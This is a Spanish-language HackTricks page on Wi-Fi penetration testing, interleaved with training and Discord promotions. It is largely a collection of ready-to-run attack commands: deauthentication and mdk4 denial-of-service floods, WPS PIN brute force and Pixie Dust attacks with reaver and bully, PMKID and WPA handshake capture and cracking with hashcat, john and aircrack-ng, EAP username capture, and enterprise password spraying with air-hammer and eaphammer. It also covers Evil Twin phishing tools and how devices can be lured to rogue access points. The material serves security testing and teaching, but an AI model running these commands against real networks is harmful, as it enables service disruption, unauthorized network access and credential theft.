# Pentesting Wifi

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

¬°√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!

**Perspectivas de Hacking**\
Participa en contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hackeo en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking de ritmo r√°pido a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre las nuevas recompensas por bugs que se lanzan y actualizaciones cruciales de la plataforma

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

## Comandos b√°sicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Herramientas

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ejecutar airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Puede realizar ataques Evil Twin, KARMA y Known Beacons y luego usar una plantilla de phishing para lograr obtener la contrase√±a real de la red o capturar credenciales de redes sociales.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta herramienta automatiza ataques de **WPS/WEP/WPA-PSK**. Autom√°ticamente:

* Configura la interfaz en modo monitor
* Escanea redes posibles - Y te permite seleccionar la(s) v√≠ctima(s)
* Si es WEP - Lanza ataques WEP
* Si es WPA-PSK
* Si es WPS: ataque de Pixie dust y el ataque de fuerza bruta (ten cuidado, el ataque de fuerza bruta podr√≠a tardar mucho tiempo). Ten en cuenta que no intenta PIN nulos o PINs generados/base de datos.
* Intenta capturar el PMKID del AP para crackearlo
* Intenta desautenticar a los clientes del AP para capturar un handshake
* Si PMKID o Handshake, intenta hacer fuerza bruta usando las 5000 contrase√±as principales.

## Resumen de Ataques

* **DoS**
* Desautenticaci√≥n/desasociaci√≥n -- Desconectar a todos (o un ESSID/Cliente espec√≠fico)
* APs falsos aleatorios -- Ocultar redes, posible colapso de esc√°neres
* Sobrecargar AP -- Intentar matar el AP (generalmente no muy √∫til)
* WIDS -- Jugar con el IDS
* TKIP, EAPOL -- Algunos ataques espec√≠ficos para DoS a ciertos APs
* **Cracking**
* Crackear **WEP** (varias herramientas y m√©todos)
* **WPA-PSK**
* **WPS** pin "Fuerza Bruta"
* **WPA PMKID** fuerza bruta
* \[DoS +] **Captura de handshake WPA** + Cracking
* **WPA-MGT**
* **Captura de Nombre de Usuario**
* **Fuerza Bruta** Credenciales
* **Evil Twin** (con o sin DoS)
* **Open** Evil Twin \[+ DoS] -- √ötil para capturar credenciales de portal cautivo y/o realizar ataques LAN
* **WPA-PSK** Evil Twin -- √ötil para ataques de red si conoces la contrase√±a
* **WPA-MGT** -- √ötil para capturar credenciales de la empresa
* **KARMA, MANA**, **Loud MANA**, **Beacon conocido**
* **+ Open** -- √ötil para capturar credenciales de portal cautivo y/o realizar ataques LAN
* **+ WPA** -- √ötil para capturar handshakes WPA

## DOS

### Paquetes de Desautenticaci√≥n

**Descripci√≥n de** [**aqu√≠**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Los ataques de **desautenticaci√≥n**, un m√©todo prevalente en el hacking de Wi-Fi, implican la falsificaci√≥n de tramas de "gesti√≥n" para **desconectar forzosamente dispositivos de una red**. Estos paquetes no cifrados enga√±an a los clientes haci√©ndoles creer que provienen de la red leg√≠tima, lo que permite a los atacantes recopilar handshakes WPA con fines de cracking o interrumpir persistentemente las conexiones de red. Esta t√°ctica, alarmante en su simplicidad, es ampliamente utilizada y tiene implicaciones significativas para la seguridad de la red.

**Desautenticaci√≥n usando Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 significa desautenticaci√≥n
* 1 es el n√∫mero de desautenticaciones a enviar (puedes enviar m√∫ltiples si lo deseas); 0 significa enviarlas continuamente
* \-a 00:14:6C:7E:40:80 es la direcci√≥n MAC del punto de acceso
* \-c 00:0F:B5:34:30:30 es la direcci√≥n MAC del cliente a desautenticar; si se omite, se env√≠a desautenticaci√≥n por difusi√≥n (no siempre funciona)
* ath0 es el nombre de la interfaz

### Paquetes de Desasociaci√≥n

**Los paquetes de desasociaci√≥n**, similares a los paquetes de desautenticaci√≥n, son un tipo de marco de gesti√≥n utilizado en redes Wi-Fi. Estos paquetes sirven para romper la conexi√≥n entre un dispositivo (como una laptop o un smartphone) y un punto de acceso (AP). La principal distinci√≥n entre desasociaci√≥n y desautenticaci√≥n radica en sus escenarios de uso. Mientras que un AP emite **paquetes de desautenticaci√≥n para eliminar expl√≠citamente dispositivos no autorizados de la red, los paquetes de desasociaci√≥n se env√≠an t√≠picamente cuando el AP est√° en proceso de apagado**, reinicio o reubicaci√≥n, lo que requiere la desconexi√≥n de todos los nodos conectados.

**Este ataque se puede realizar con mdk4(modo "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **M√°s ataques DOS con mdk4**

**En** [**aqu√≠**](https://en.kali.tools/?p=864)**.**

**MODO DE ATAQUE b: Inundaci√≥n de Beacon**

Env√≠a tramas de beacon para mostrar APs falsos a los clientes. ¬°Esto a veces puede hacer que los esc√°neres de red e incluso los controladores se bloqueen!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODO DE ATAQUE a: Denegaci√≥n de Servicio de Autenticaci√≥n**

Enviar tramas de autenticaci√≥n a todos los Puntos de Acceso (APs) accesibles dentro del rango puede sobrecargar estos APs, especialmente cuando hay numerosos clientes involucrados. Este tr√°fico intenso puede llevar a la inestabilidad del sistema, causando que algunos APs se congelen o incluso se reinicien.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODO DE ATAQUE p: Sondeo de SSID y Fuerza Bruta**

El sondeo de Puntos de Acceso (APs) verifica si un SSID est√° correctamente revelado y confirma el rango del AP. Esta t√©cnica, junto con **la fuerza bruta de SSIDs ocultos** con o sin una lista de palabras, ayuda a identificar y acceder a redes ocultas.

**MODO DE ATAQUE m: Explotaci√≥n de Contramedidas de Michael**

Enviar paquetes aleatorios o duplicados a diferentes colas de QoS puede activar las Contramedidas de Michael en **APs TKIP**, lo que lleva a un apagado del AP de un minuto. Este m√©todo es una t√°ctica eficiente de ataque **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODO DE ATAQUE e: Inyecci√≥n de Paquetes EAPOL Start y Logoff**

Inundar un AP con **tramas EAPOL Start** crea **sesiones falsas**, abrumando al AP y bloqueando a los clientes leg√≠timos. Alternativamente, inyectar **mensajes EAPOL Logoff falsos** desconecta forzosamente a los clientes, ambos m√©todos interrumpen efectivamente el servicio de la red.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODO DE ATAQUE s: Ataques para redes de malla IEEE 802.11s**

Varios ataques a la gesti√≥n de enlaces y el enrutamiento en redes de malla.

**MODO DE ATAQUE w: Confusi√≥n de WIDS**

Conectar clientes a m√∫ltiples nodos WDS o APs falsos puede manipular los Sistemas de Detecci√≥n y Prevenci√≥n de Intrusiones, creando confusi√≥n y potencial abuso del sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODO DE ATAQUE f: Fuzzing de Paquetes**

Un fuzzing de paquetes que presenta diversas fuentes de paquetes y un conjunto completo de modificadores para la manipulaci√≥n de paquetes.

### **Airggedon**

_**Airgeddon**_ ofrece la mayor√≠a de los ataques propuestos en los comentarios anteriores:

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifica el proceso de conexi√≥n de dispositivos a un enrutador, mejorando la velocidad y facilidad de configuraci√≥n para redes encriptadas con **WPA** o **WPA2** Personal. Es ineficaz para la seguridad WEP, que es f√°cilmente comprometida. WPS emplea un PIN de 8 d√≠gitos, validado en dos mitades, lo que lo hace susceptible a ataques de fuerza bruta debido a su n√∫mero limitado de combinaciones (11,000 posibilidades).

### Fuerza Bruta WPS

Hay 2 herramientas principales para realizar esta acci√≥n: Reaver y Bully.

* **Reaver** ha sido dise√±ado para ser un ataque robusto y pr√°ctico contra WPS, y ha sido probado contra una amplia variedad de puntos de acceso e implementaciones de WPS.
* **Bully** es una **nueva implementaci√≥n** del ataque de fuerza bruta WPS, escrita en C. Tiene varias ventajas sobre el c√≥digo original de reaver: menos dependencias, mejor rendimiento de memoria y CPU, manejo correcto de endianness, y un conjunto de opciones m√°s robusto.

El ataque explota la **vulnerabilidad del PIN WPS**, particularmente su exposici√≥n de los primeros cuatro d√≠gitos y el papel del √∫ltimo d√≠gito como un checksum, facilitando el ataque de fuerza bruta. Sin embargo, las defensas contra ataques de fuerza bruta, como **bloquear direcciones MAC** de atacantes agresivos, exigen **rotaci√≥n de direcciones MAC** para continuar el ataque.

Al obtener el PIN WPS con herramientas como Bully o Reaver, el atacante puede deducir el WPA/WPA2 PSK, asegurando **acceso persistente a la red**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Fuerza Bruta Inteligente**

Este enfoque refinado apunta a los PINs de WPS utilizando vulnerabilidades conocidas:

1. **PINs predescubiertos**: Utiliza una base de datos de PINs conocidos vinculados a fabricantes espec√≠ficos que utilizan PINs de WPS uniformes. Esta base de datos correlaciona los primeros tres octetos de las direcciones MAC con los PINs probables para estos fabricantes.
2. **Algoritmos de generaci√≥n de PIN**: Aprovecha algoritmos como ComputePIN y EasyBox, que calculan los PINs de WPS bas√°ndose en la direcci√≥n MAC del AP. El algoritmo Arcadyan adem√°s requiere un ID de dispositivo, a√±adiendo una capa al proceso de generaci√≥n del PIN.

### Ataque WPS Pixie Dust

**Dominique Bongard** descubri√≥ un fallo en algunos Puntos de Acceso (APs) relacionado con la creaci√≥n de c√≥digos secretos, conocidos como **nonces** (**E-S1** y **E-S2**). Si estos nonces pueden ser descubiertos, descifrar el PIN de WPS del AP se vuelve f√°cil. El AP revela el PIN dentro de un c√≥digo especial (hash) para probar que es leg√≠timo y no un AP falso (rogue). Estos nonces son esencialmente las "llaves" para desbloquear la "caja fuerte" que contiene el PIN de WPS. M√°s sobre esto se puede encontrar [aqu√≠](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

En t√©rminos simples, el problema es que algunos APs no utilizaron llaves lo suficientemente aleatorias para encriptar el PIN durante el proceso de conexi√≥n. Esto hace que el PIN sea vulnerable a ser adivinado desde fuera de la red (ataque de fuerza bruta offline).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si no quieres cambiar el dispositivo a modo monitor, o `reaver` y `bully` tienen alg√∫n problema, puedes probar [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Esta herramienta puede realizar un ataque Pixie Dust sin tener que cambiar a modo monitor.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Algunos sistemas mal dise√±ados incluso permiten que un **Null PIN** (un PIN vac√≠o o inexistente) otorgue acceso, lo cual es bastante inusual. La herramienta **Reaver** es capaz de probar esta vulnerabilidad, a diferencia de **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos los ataques WPS propuestos se pueden realizar f√°cilmente utilizando _**airgeddon.**_

![](<../../.gitbook/assets/image (219).png>)

* 5 y 6 te permiten probar **tu PIN personalizado** (si tienes alguno)
* 7 y 8 realizan el **ataque Pixie Dust**
* 13 te permite probar el **PIN NULL**
* 11 y 12 **recolectar√°n los PINs relacionados con el AP seleccionado de bases de datos disponibles** y **generar√°n** posibles **PINs** utilizando: ComputePIN, EasyBox y opcionalmente Arcadyan (recomendado, ¬øpor qu√© no?)
* 9 y 10 probar√°n **cada PIN posible**

## **WEP**

Tan roto y sin usar en la actualidad. Solo sepas que _**airgeddon**_ tiene una opci√≥n WEP llamada "All-in-One" para atacar este tipo de protecci√≥n. M√°s herramientas ofrecen opciones similares.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

¬°√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores!

**Perspectivas de Hacking**\
Participa en contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hackeo en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking de ritmo r√°pido a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre las nuevas recompensas por errores que se lanzan y actualizaciones cruciales de la plataforma

¬°√önete a nosotros en [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

***

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [revel√≥](https://hashcat.net/forum/thread-7717.html) un nuevo m√©todo de ataque, √∫nico porque solo necesita **un solo paquete** y no requiere que ning√∫n cliente est√© conectado al AP objetivo, solo interacci√≥n entre el atacante y el AP.

Muchos enrutadores modernos a√±aden un **campo opcional** al **primer marco EAPOL** durante la asociaci√≥n, conocido como `Robust Security Network`. Esto incluye el `PMKID`.

Como explica la publicaci√≥n original, el **PMKID** se crea utilizando datos conocidos:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que el "Nombre PMK" es constante, conocemos el BSSID del AP y de la estaci√≥n, y el `PMK` es id√©ntico al de un apret√≥n de manos completo de 4 v√≠as, **hashcat** puede usar esta informaci√≥n para descifrar el PSK y recuperar la frase de paso.

Para **reunir** esta informaci√≥n y **fuerza bruta** localmente la contrase√±a, puedes hacer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Los **PMKIDs capturados** se mostrar√°n en la **consola** y tambi√©n se **guardar√°n** dentro de \_ **/tmp/attack.pcap**\_\
Ahora, convierte la captura al formato de **hashcat/john** y crack√©alo:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Por favor, tenga en cuenta que el formato de un hash correcto contiene **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Si el suyo **solo** contiene **3 partes**, entonces, es **inv√°lido** (la captura de PMKID no fue v√°lida).

Tenga en cuenta que `hcxdumptool` **tambi√©n captura handshakes** (algo como esto aparecer√°: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Podr√≠a **transformar** los **handshakes** al formato de **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_He notado que algunos handshakes capturados con esta herramienta no pudieron ser descifrados incluso sabiendo la contrase√±a correcta. Recomendar√≠a capturar handshakes tambi√©n de manera tradicional si es posible, o capturar varios de ellos usando esta herramienta._

### Captura de handshakes

Un ataque a redes **WPA/WPA2** se puede ejecutar capturando un **handshake** y tratando de **crackear** la contrase√±a **offline**. Este proceso implica monitorear la comunicaci√≥n de una red espec√≠fica y **BSSID** en un **canal** particular. Aqu√≠ hay una gu√≠a simplificada:

1. Identifica el **BSSID**, **canal** y un **cliente conectado** de la red objetivo.
2. Usa `airodump-ng` para monitorear el tr√°fico de la red en el canal y BSSID especificados, con la esperanza de capturar un handshake. El comando se ver√° as√≠:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar la probabilidad de capturar un handshake, desconecte moment√°neamente al cliente de la red para forzar una re-autenticaci√≥n. Esto se puede hacer utilizando el comando `aireplay-ng`, que env√≠a paquetes de desautenticaci√≥n al cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note que, como el cliente fue desautenticado, podr√≠a intentar conectarse a un AP diferente o, en otros casos, a una red diferente._

Una vez que en `airodump-ng` aparece informaci√≥n de handshake, esto significa que el handshake fue capturado y puedes dejar de escuchar:

![](<../../.gitbook/assets/image (172) (1).png>)

Una vez que el handshake es capturado, puedes **crackearlo** con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar si el apret√≥n de manos est√° en el archivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si esta herramienta encuentra un apret√≥n de manos incompleto de un ESSID antes del completado, no detectar√° el v√°lido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

En **configuraciones de WiFi empresarial, encontrar√°s varios m√©todos de autenticaci√≥n**, cada uno proporcionando diferentes niveles de seguridad y caracter√≠sticas de gesti√≥n. Cuando uses herramientas como `airodump-ng` para inspeccionar el tr√°fico de red, podr√≠as notar identificadores para estos tipos de autenticaci√≥n. Algunos m√©todos comunes incluyen:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Este m√©todo admite tokens de hardware y contrase√±as de un solo uso dentro de EAP-PEAP. A diferencia de MSCHAPv2, no utiliza un desaf√≠o entre pares y env√≠a contrase√±as en texto claro al punto de acceso, lo que plantea un riesgo para ataques de degradaci√≥n.
2. **EAP-MD5 (Message Digest 5)**:
* Implica enviar el hash MD5 de la contrase√±a desde el cliente. **No se recomienda** debido a la vulnerabilidad a ataques de diccionario, la falta de autenticaci√≥n del servidor y la incapacidad de generar claves WEP espec√≠ficas de la sesi√≥n.
3. **EAP-TLS (Transport Layer Security)**:
* Utiliza certificados tanto del lado del cliente como del servidor para la autenticaci√≥n y puede generar din√°micamente claves WEP basadas en el usuario y la sesi√≥n para asegurar las comunicaciones.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* Proporciona autenticaci√≥n mutua a trav√©s de un t√∫nel encriptado, junto con un m√©todo para derivar claves WEP din√°micas, por usuario y por sesi√≥n. Solo requiere certificados del lado del servidor, con los clientes utilizando credenciales.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* Funciona de manera similar a EAP al crear un t√∫nel TLS para comunicaci√≥n protegida. Permite el uso de protocolos de autenticaci√≥n m√°s d√©biles sobre EAP debido a la protecci√≥n ofrecida por el t√∫nel.
* **PEAP-MSCHAPv2**: A menudo se refiere a PEAP, combina el mecanismo de desaf√≠o/respuesta vulnerable de MSCHAPv2 con un t√∫nel TLS protector.
* **PEAP-EAP-TLS (o PEAP-TLS)**: Similar a EAP-TLS pero inicia un t√∫nel TLS antes de intercambiar certificados, ofreciendo una capa adicional de seguridad.

Puedes encontrar m√°s informaci√≥n sobre estos m√©todos de autenticaci√≥n [aqu√≠](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) y [aqu√≠](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Captura de Nombre de Usuario

Leyendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que si est√°s usando **EAP**, los **mensajes de "Identidad"** deben ser **soportados**, y el **nombre de usuario** se enviar√° en **claro** en los **mensajes de "Respuesta de Identidad"**.

Incluso usando uno de los m√©todos de autenticaci√≥n m√°s seguros: **PEAP-EAP-TLS**, es posible **capturar el nombre de usuario enviado en el protocolo EAP**. Para hacerlo, **captura una comunicaci√≥n de autenticaci√≥n** (inicia `airodump-ng` dentro de un canal y `wireshark` en la misma interfaz) y filtra los paquetes por `eapol`.\
Dentro del paquete "**Respuesta, Identidad**", aparecer√° el **nombre de usuario** del cliente.

![](<../../.gitbook/assets/image (850).png>)

### Identidades An√≥nimas

El ocultamiento de identidad es soportado tanto por EAP-PEAP como por EAP-TTLS. En el contexto de una red WiFi, una solicitud de EAP-Identidad es t√≠picamente iniciada por el punto de acceso (AP) durante el proceso de asociaci√≥n. Para asegurar la protecci√≥n de la anonimidad del usuario, la respuesta del cliente EAP en el dispositivo del usuario contiene solo la informaci√≥n esencial requerida para que el servidor RADIUS inicial procese la solicitud. Este concepto se ilustra a trav√©s de los siguientes escenarios:

* EAP-Identidad = an√≥nimo
* En este escenario, todos los usuarios emplean el seud√≥nimo "an√≥nimo" como su identificador de usuario. El servidor RADIUS inicial funciona como un servidor EAP-PEAP o EAP-TTLS, responsable de gestionar el lado del servidor del protocolo PEAP o TTLS. El m√©todo de autenticaci√≥n interno (protegido) se maneja localmente o se delega a un servidor RADIUS remoto (de origen).
* EAP-Identidad = an√≥nimo@realm\_x
* En esta situaci√≥n, los usuarios de diferentes dominios ocultan sus identidades mientras indican sus respectivos dominios. Esto permite que el servidor RADIUS inicial act√∫e como proxy para las solicitudes EAP-PEAP o EAP-TTLS a los servidores RADIUS en sus dominios de origen, que act√∫an como el servidor PEAP o TTLS. El servidor RADIUS inicial opera √∫nicamente como un nodo de retransmisi√≥n RADIUS.
* Alternativamente, el servidor RADIUS inicial puede funcionar como el servidor EAP-PEAP o EAP-TTLS y manejar el m√©todo de autenticaci√≥n protegido o reenviarlo a otro servidor. Esta opci√≥n facilita la configuraci√≥n de pol√≠ticas distintas para varios dominios.

En EAP-PEAP, una vez que se establece el t√∫nel TLS entre el servidor PEAP y el cliente PEAP, el servidor PEAP inicia una solicitud de EAP-Identidad y la transmite a trav√©s del t√∫nel TLS. El cliente responde a esta segunda solicitud de EAP-Identidad enviando una respuesta de EAP-Identidad que contiene la verdadera identidad del usuario a trav√©s del t√∫nel encriptado. Este enfoque previene efectivamente la revelaci√≥n de la verdadera identidad del usuario a cualquier persona que est√© escuchando el tr√°fico 802.11.

EAP-TTLS sigue un procedimiento ligeramente diferente. Con EAP-TTLS, el cliente t√≠picamente se autentica usando PAP o CHAP, asegurado por el t√∫nel TLS. En este caso, el cliente incluye un atributo User-Name y ya sea un atributo Password o CHAP-Password en el mensaje TLS inicial enviado despu√©s del establecimiento del t√∫nel.

Independientemente del protocolo elegido, el servidor PEAP/TTLS obtiene conocimiento de la verdadera identidad del usuario despu√©s de que se ha establecido el t√∫nel TLS. La verdadera identidad puede representarse como user@realm o simplemente user. Si el servidor PEAP/TTLS tambi√©n es responsable de autenticar al usuario, ahora posee la identidad del usuario y procede con el m√©todo de autenticaci√≥n protegido por el t√∫nel TLS. Alternativamente, el servidor PEAP/TTLS puede reenviar una nueva solicitud RADIUS al servidor RADIUS del hogar del usuario. Esta nueva solicitud RADIUS omite la capa del protocolo PEAP o TTLS. En los casos en que el m√©todo de autenticaci√≥n protegido sea EAP, los mensajes EAP internos se transmiten al servidor RADIUS del hogar sin el envoltorio EAP-PEAP o EAP-TTLS. El atributo User-Name del mensaje RADIUS saliente contiene la verdadera identidad del usuario, reemplazando el User-Name an√≥nimo de la solicitud RADIUS entrante. Cuando el m√©todo de autenticaci√≥n protegido es PAP o CHAP (soportado solo por TTLS), el User-Name y otros atributos de autenticaci√≥n extra√≠dos de la carga √∫til TLS se sustituyen en el mensaje RADIUS saliente, desplazando el User-Name an√≥nimo y los atributos TTLS EAP-Message encontrados en la solicitud RADIUS entrante.

Para m√°s informaci√≥n consulta [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (spray de contrase√±as)

Si se espera que el cliente use un **nombre de usuario y contrase√±a** (ten en cuenta que **EAP-TLS no ser√° v√°lido** en este caso), entonces podr√≠as intentar obtener una **lista** de **nombres de usuario** (ver la siguiente parte) y **contrase√±as** y tratar de **forzar** el acceso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Tambi√©n podr√≠as realizar este ataque utilizando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teor√≠a de ataques al cliente

### Selecci√≥n de red y roaming

* El protocolo 802.11 define c√≥mo una estaci√≥n se une a un Conjunto de Servicio Ampliado (ESS), pero no especifica los criterios para seleccionar un ESS o un punto de acceso (AP) dentro de √©l.
* Las estaciones pueden moverse entre APs que comparten el mismo ESSID, manteniendo la conectividad a trav√©s de un edificio o √°rea.
* El protocolo requiere autenticaci√≥n de la estaci√≥n al ESS, pero no exige autenticaci√≥n del AP a la estaci√≥n.

### Listas de redes preferidas (PNL)

* Las estaciones almacenan el ESSID de cada red inal√°mbrica a la que se conectan en su Lista de Redes Preferidas (PNL), junto con detalles de configuraci√≥n espec√≠ficos de la red.
* La PNL se utiliza para conectarse autom√°ticamente a redes conocidas, mejorando la experiencia del usuario al simplificar el proceso de conexi√≥n.

### Escaneo pasivo

* Los APs transmiten peri√≥dicamente tramas de baliza, anunciando su presencia y caracter√≠sticas, incluido el ESSID del AP a menos que la transmisi√≥n est√© desactivada.
* Durante el escaneo pasivo, las estaciones escuchan las tramas de baliza. Si el ESSID de una baliza coincide con una entrada en la PNL de la estaci√≥n, la estaci√≥n puede conectarse autom√°ticamente a ese AP.
* El conocimiento de la PNL de un dispositivo permite una posible explotaci√≥n al imitar el ESSID de una red conocida, enga√±ando al dispositivo para que se conecte a un AP malicioso.

